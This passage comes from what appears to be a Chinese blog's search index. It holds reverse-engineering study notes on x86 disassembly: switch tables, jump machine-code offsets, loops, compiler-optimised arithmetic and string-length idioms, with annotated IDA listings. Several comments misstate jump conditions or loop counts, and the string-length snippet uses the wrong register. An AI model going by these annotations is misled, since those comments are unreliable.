dword ptr 4.text:00401000 argv = dword ptr 8.text:00401000 envp = dword ptr 0Ch.text:00401000.text:00401000 push ecx.text:00401001 lea eax, [esp+4+var_4].text:00401005 push eax.text:00401006 push offset aD ; &quot;%d&quot;.text:0040100B call _scanf.text:00401010 mov ecx, [esp+0Ch+var_4].text:00401014 add esp, 8.text:00401017 lea eax, [ecx-1] ; switch 7 cases.text:0040101A cmp eax, 6 ;判断是否为default节点.text:0040101D ja short loc_40109D ; jumptable 0040101F default case.text:0040101F jmp ds:off_4010B0[eax*4] ; switch jump.text:00401026 push offset aA1 ; jumptable case 1.text:0040102B call sub_4010D0 ;回到跳转表.text:00401030 add esp, 4.text:00401033 xor eax, eax.text:00401035 pop ecx 转移指令机器码计算根据转移距离的不同，转移指令有以下类型： 短转移(Short Jump)：无条件跳转和跳转转移的机器码均为2字节，转移范围是-128~127字节 长转移(Long Jump)：无条件跳转的机器码为5字节，条件转移的机器码为6字节。这是因为，条件转移需要用2字节表示其转移类型(jg,jz,jns)，其他4字节表示转移偏移量。而无条件跳转仅用1字节就可以标砖其转移类型，其他4字节表示转移偏移量。 子程序调用指令(call):call指令调用有两类。一类调用是我们平时经常接触的，类似于长转移；零一类调用的参数涉及寄存器、栈灯值，比较复杂，。 条件转移指令的转移范围是16位模式遗留下来的。当时，为了使代码紧凑一些，CPU开发人员只给目的地址分配了1字节，这样就将跳转的长度限制在了255字节之内。 有两个因素可以限制转移指令的机器码，一个是上图，一个是转移的位移量 短转移指令机器码计算在代码中的片段： 123:401000 jmp 401005:401005 xor eax,eax 无条件短转移的机器码形式位”EBxx”，其中EB00hEB7Fh是向后转移，EB80hEBFFh是向前转移。 位移量 = 目的地址 - 起始地址 - 跳转指令本身长度 转移指令机器码 = 转移类别机器码 + 位移量 长转移指令机器码计算在代码段中有一条无条件转移指令，代码如下: 123:401000 jmp 402398:402398 xor eax,eax 无条件长跳转指令的长度是5字节，机器码是”E9”。 00402398h-00401000h-5h=00001393h 循环循环是高级语言中可以进行反向引用的一种语言形式，其他类型的分支语句都是由低地址向高地址引用的。 12345xor ecx,ecx ;将ecx清零00440000inc ecx ;计数cmp ecx,5 ;循环6次jbe 00440000 ;重复 上面的代码改写为c语言有两种写法： 123456789while (i&lt;5){ ......}for(i=0;i&lt;5;i++){ ......} 小例子查看汇编代码： 12345678910#include &lt;stdio.h&gt;int main(void){ int sum=0,i=0; for(i=0;i&lt;100;i++) { sum = sum + i; }} 汇编代码如下： 123456789101112131415161718192021222324252627.text:00401000 push ebp.text:00401001 mov ebp, esp ;建立栈.text:00401003 sub esp, 8 ;为局部变量分配内存.text:00401006 mov [ebp+var_4], 0 ;初始化局部变量[ebp-4].text:0040100D mov [ebp+var_8], 0 ;初始化局部变量[ebp-8].text:00401014 mov [ebp+var_8], 0 ;初始化局部变量[ebp-8].text:0040101B jmp short loc_401026 ;循环从00401026处开始.text:0040101D ; ---------------------------------------------------------------------------.text:0040101D.text:0040101D loc_40101D: ; CODE XREF: _main+35\u0019j.text:0040101D mov eax, [ebp+var_8] ;将变量[ebp+08]的值传递给eax.text:00401020 add eax, 1 ;eax加1.text:00401023 mov [ebp+var_8], eax ;更新变量[ebp+08]的值，即i++.text:00401026.text:00401026 loc_401026: ; CODE XREF: _main+1B\u0018j.text:00401026 cmp [ebp+var_8], 64h ;将更新过后的局部变量与100进行比较，64h的是十六进制，100是十进制.text:0040102A jge short loc_401037 ;如果i大于100，退出循环.text:0040102C mov ecx, [ebp+var_4] ;将变量[ebp+04]放到ecx中.text:0040102F add ecx, [ebp+var_8] ;相当于sum+i.text:00401032 mov [ebp+var_4], ecx ;sum = sum+i.text:00401035 jmp short loc_40101D ;这个跳转是由低地址向高地址跳转的.text:00401037 ; ---------------------------------------------------------------------------.text:00401037.text:00401037 loc_401037: ; CODE XREF: _main+2A\u0018j.text:00401037 mov esp, ebp.text:00401039 pop ebp ;关闭栈.text:0040103A retn 开启优化选项后： 123456789.text:00401000 xor ecx, ecx ;初始化变量，sum=0.text:00401002 xor eax, eax ;初始化变量，i=0.text:00401004.text:00401004 loc_401004: ; CODE XREF: _main+A\u0019j.text:00401004 add ecx, eax ;相当于sum=sum+i.text:00401006 inc eax ;eax的值加1，即i++.text:00401007 cmp eax, 64h ;eax的值与64h做比较.text:0040100A jl short loc_401004 ;如果eax&gt;100,则退出循环.text:0040100C retn 数学运算符整数的加法和减法在一般情况下，整数的加法和减法都会被编译成add和sub指令。在进行编译优化的时候，很多人喜欢用lea指令代替add和sub指令。 加法1234567#include &lt;stdio.h&gt;int main(void){ int a,b; printf(&quot;%d&quot;,a+b+0x78); return 0;} 汇编代码如下： 12345678910.text:00401000 push ecx ;为局部变量分配内存.text:00401001 mov eax, [esp+4+var_4].text:00401005 mov ecx, [esp+4+var_4].text:00401009 lea edx, [ecx+eax+78h] ;快速计算ecx+eax+78h.text:0040100D push edx.text:0040100E push offset aD ; &quot;%d&quot;.text:00401013 call _printf ;printf函数.text:00401018 xor eax, eax.text:0040101A add esp, 0Ch.text:0040101D retn lea指令是一条纯算术指令 乘法乘法指令一般被编译成mul、imul指令，这些指令运算速度比较慢。编译器为了速度，倾向于使用其他指令来完成同样的计算。如果一个数是2的幂次方，那么会用左移运指令shl来实现乘法运算。 1234567#include &lt;stdio.h&gt;int main(void){ int a; printf(&quot;%d %d %d&quot;,a*11+4,a*9,a*2); return 0;} 汇编指令如下： 1234567891011121314.text:00401000 push ecx ;为局部变量开辟内存空间.text:00401001 mov eax, [esp+4+var_4] ;.text:00401005 lea ecx, [eax+eax] ;即a*2.text:00401008 lea edx, [eax+eax*8] ;edx=a+8*a=9*a.text:0040100B push ecx.text:0040100C lea ecx, [eax+eax*4] ;ecx=a+4*a=5*a.text:0040100F push edx.text:00401010 lea edx, [eax+ecx*2+4] ;edx=a+2*ecx+4=11*a+4.text:00401014 push edx.text:00401015 push offset aDDD ; &quot;%d %d %d&quot;.text:0040101A call _printf.text:0040101F xor eax, eax.text:00401021 add esp, 14h.text:00401024 retn 除法除法运算符一般为编译为div，idiv指令。除法运算的代价是相当高得，大概需要比乘法运算多消费10倍得CPU时钟。 如果除数是2得幂次方，那么可以用快速得移位指令shr来替换。 shr指令适合进行无符号数计算。若进行符号数计算，则使用sar指令 123456789#include &lt;stdio.h&gt;int main(void){ int a; scanf(&quot;%d&quot;,&amp;a); printf(&quot;%d&quot;,a/11); return 0;} 未优化汇编指令如下： 1234567891011121314151617181920.text:00401000 push ebp ;建立栈.text:00401001 mov ebp, esp.text:00401003 push ecx ;给局部变量分配空间.text:00401004 lea eax, [ebp+var_4].text:00401007 push eax.text:00401008 push offset aD_0 ; &quot;%d&quot;.text:0040100D call _scanf.text:00401012 add esp, 8.text:00401015 mov eax, [ebp+var_4] ;eax中为输入得a值.text:00401018 cdq ;将eax得值扩展为4字类型得值.text:00401019 mov ecx, 0Bh ;将除数11(十六进制为0bh)放入ecx.text:0040101E idiv ecx ;除法运算，商放入eax，余数放入edx.text:00401020 push eax.text:00401021 push offset aD ; &quot;%d&quot;.text:00401026 call _printf.text:0040102B add esp, 8.text:0040102E xor eax, eax.text:00401030 mov esp, ebp.text:00401032 pop ebp.text:00401033 retn 优化过后得汇编代码： 123456789101112131415161718.text:00401000 push ecx ;为局部变量a分配内存.text:00401001 lea eax, [esp+4+var_4] ;将变量a得值赋给ecx.text:00401005 push eax.text:00401006 push offset aD ; &quot;%d&quot;.text:0040100B call _scanf.text:00401010 mov ecx, [esp+0Ch+var_4].text:00401014 mov eax, 2E8BA2E9h ;编译生成得数，用于将除法转换为乘法.text:00401019 imul ecx.text:0040101B sar edx, 1.text:0040101D mov ecx, edx.text:0040101F shr ecx, 1Fh.text:00401022 add edx, ecx.text:00401024 push edx.text:00401025 push offset aD ; &quot;%d&quot;.text:0040102A call _printf.text:0040102F xor eax, eax.text:00401031 add esp, 14h.text:00401034 retn 文本字符串字符寻址指令80x86系统支持寄存器直接寻址与寄存器间接寻址等模式。 mov指令将当前指令所在内存复制并放到目的寄存器中，其操作书可以是常量，也可以是指针。 12mov eax,[401000h] ;直接寻址，即把地址为00401000h的双字数据放入eaxmov eax,[ecx] ;寄存器间接寻址，即把ecx中的地址所指的内容放入eax “lea”的意思是”装入有效地址”，它的操作数就是地址，所以”lea eax,[addr]”就是将表达式addr的值放入eax寄存器 1lea eax,[401000h] ;将值401000h写入eax寄存器 lea指令右边的操作数表示一个近指针，指令”lea eax,[401000h]与”mov eax,401000h”是等价的 在计算索引与常量的时，编译器一般将指针放在的第一个位置，而不考虑它们在程序中的顺序 12mov dword ptr [eax+8],67452301mov dword ptr [eax+c],EFCDAB89 “lea eax,[eax+8]”等价于”add eax,8” 计算字符串的长度1234567mov eax,FFFFFFFF ;如果看到这一句，程序很有可能是要获得字符串的长度sub eax,eax ; 将eax清零repnz ;重复串操作，直到ecx=0为止scasb ;把al的内容与edi指向的附加段中的数据逐一比较not ecx ;ecx=字符长度+1dec ecx ;ecx是真实的长度","link":"/2019/11/25/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Assembly","slug":"Assembly","link":"/tags/Assembly/"},{"name":"C++","slug":"C","link":"/tags/C/"},{"name":"CrackMe","slug":"CrackMe","link":"/tags/CrackMe/"},{"name":"Windows-Kernel","slug":"Windows-Kernel","link":"/tags/Windows-Kernel/"},{"name":"Windows-PE","slug":"Windows-PE","link":"/tags/Windows-PE/"},{"name":"Windows-PE权威指南","slug":"Windows-PE权威指南","link":"/tags/Windows-PE%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"Scoket","slug":"Scoket","link":"/tags/Scoket/"},{"name":"Windows程序设计","slug":"Windows程序设计","link":"/tags/Windows%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"},{"name":"c","slug":"c","link":"/tags/c/"},{"name":"HOOK","slug":"HOOK","link":"/tags/HOOK/"},{"name":"Hacker","slug":"Hacker","link":"/tags/Hacker/"},{"name":"Reverse","slug":"Reverse","link":"/tags/Reverse/"}],"categories":[{"name":"汇编语言","slug":"汇编语言","link":"/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"汇编语言-基于x86处理器","slug":"汇编语言-基于x86处理器","link":"/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E5%9F%BA%E4%BA%8Ex86%E5%A4%84%E7%90%86%E5%99%A8/"},{"name":"C++","slug":"C","link":"/categories/C/"},{"name":"CrackMe","slug":"CrackMe","link":"/categories/CrackMe/"},{"name":"反汇编","slug":"反汇编","link":"/categories/%E5%8F%8D%E6%B1%87%E7%BC%96/"},{"name":"Windows核心编程","slug":"Windows核心编程","link":"/categories/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/"},{"name":"Windows PE权威指南","slug":"Windows-PE权威指南","link":"/categories/Windows-PE%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97/"},{"name":"Windows-PE权威指南","slug":"Windows-PE权威指南","link":"/categories/Windows-PE%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97/"},{"name":"Bugku","slug":"Bugku","link":"/categories/Bugku/"},{"name":"Windows32汇编语言设计","slug":"Windows32汇编语言设计","link":"/categories/Windows32%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E8%AE%BE%E8%AE%A1/"},{"name":"网络编程","slug":"网络编程","link":"/categories/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"Windows内核原理与实现","slug":"Windows内核原理与实现","link":"/categories/Windows%E5%86%85%E6%A0%B8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/"},{"name":"Windows-API开发详解","slug":"Windows-API开发详解","link":"/categories/Windows-API%E5%BC%80%E5%8F%91%E8%AF%A6%E8%A7%A3/"},{"name":"Windows程序设计","slug":"Windows程序设计","link":"/categories/Windows%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"},{"name":"C与指针","slug":"C与指针","link":"/categories/C%E4%B8%8E%E6%8C%87%E9%92%88/"},{"name":"C程序设计语言","slug":"C程序设计语言","link":"/categories/C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80/"},{"name":"C++黑客编程","slug":"C-黑客编程","link":"/categories/C-%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"加密与解密","slug":"加密与解密","link":"/categories/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"},{"name":"逆向工程权威指南","slug":"逆向工程权威指南","link":"/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97/"},{"name":"逆向工程核心原理","slug":"逆向工程核心原理","link":"/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"name":"黑客编程","slug":"黑客编程","link":"/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}]}